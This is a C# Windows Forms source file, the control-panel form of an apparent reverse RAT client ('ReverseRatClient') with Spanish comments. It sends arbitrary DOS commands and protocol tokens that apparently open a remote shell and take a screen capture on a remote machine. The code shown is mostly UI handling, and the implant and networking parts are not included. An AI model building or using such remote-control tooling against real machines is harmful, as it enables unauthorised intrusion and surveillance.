using System;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace ReverseRatClient
{
    public partial class PanelDeControl : Form
    {
        Miscelanea  Msc = new Miscelanea();
        //Create your private font collection object.
        PrivateFontCollection pfc = new PrivateFontCollection();
        public PanelDeControl()
        {
            InitializeComponent();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            ProcesarComandos(textBox2.Text);
        }

        private void ProcesarComandos(string comando)
        {
            // Envia cualquier conmando DOS
            var pc = (Principal) Msc.DevolverMDI("Principal");
            pc.EnviarComando(comando, Text);
            
            textBox3.Text = comando.Trim();
            switch (comando )
            {
                case "cls":
                    textBox1.Text = "";
                    break;
                case "exit":
                    textBox1.AppendText("\r\nSesion finalizada\r\n");
                    ScrollVentanaDos();
                    textBox1.ReadOnly = true;
                    break;
            }

            textBox2.Text = "";
            AgregarNuevaLinea();
        }

        private void AgregarNuevaLinea()
        {
            
            textBox1.Text = textBox1.Text + "\r\n";
            ScrollVentanaDos();
            
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode== Keys.Return)
                button3.PerformClick();
        }

        private void PanelDeControl_Load(object sender, EventArgs e)
        {
          
           
      
        }


        private void PanelDeControl_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Escape)
                Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            ProcesarComandos("<:hola:>");          
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string[] campos;
            campos = textBox1.Text.Split('>');
            textBox2.Text = campos[campos.GetUpperBound(0)];
          //  textBox3.Text = textBox1.Text.Substring(textBox1.Text.Length - 3, 1);
        }
       

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Down || e.KeyCode == Keys.Up || e.KeyCode == Keys.Left)
            {             
                e.Handled = true;
            }
            else
            {
                e.Handled = false;
            }
            

        }

        private void textBox1_KeyUp(object sender, KeyEventArgs e)
        {
            //MessageBox.Show(e.KeyCode.ToString());

         
            if (e.KeyCode != Keys.Return)
                button2.PerformClick();           
            else
              ProcesarComandos(textBox2.Text);
        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            //MessageBox.Show(tabControl1.SelectedIndex.ToString());
            
        }

        void EstablecerFuenteLetraShell()
        {            
                try
                {
                    PrivateFontCollection modernFont = new PrivateFontCollection();
                    modernFont.AddFontFile("VGASquarePx.ttf");
                    textBox1.Font = new Font(modernFont.Families[0], 19);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }            
        }

        private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
        {        
        }

        private void textBox1_PreviewKeyDown(object sender, PreviewKeyDownEventArgs e)
        {                          
            if ((e.KeyCode == Keys.Left || e.KeyCode == Keys.Back) && textBox1.Text.Substring(textBox1.SelectionStart - 1, 1) == ">")
                textBox1.ReadOnly = true;
            else
                textBox1.ReadOnly = false;
        }

        private void textBox1_Click(object sender, EventArgs e)
        {
             ScrollVentanaDos();
        }


        void ScrollVentanaDos()
        {
            // Scroll hasta el final de TxtBox de Shell cuando hay intervencion de Mouse
            textBox1.SelectionStart = textBox1.TextLength;
            textBox1.ScrollToCaret();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            textBox1.ReadOnly = false;
            textBox2.Text = "<:shell:>";
            ProcesarComandos(textBox2.Text);
            EstablecerFuenteLetraShell();
            tabControl1.SelectTab(tabPage2);
            textBox1.Focus();
            ScrollVentanaDos();           
        }

        private void button5_Click(object sender, EventArgs e)
        {
            ProcesarComandos("<:captura:>");
        }

        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }
    }

   
}
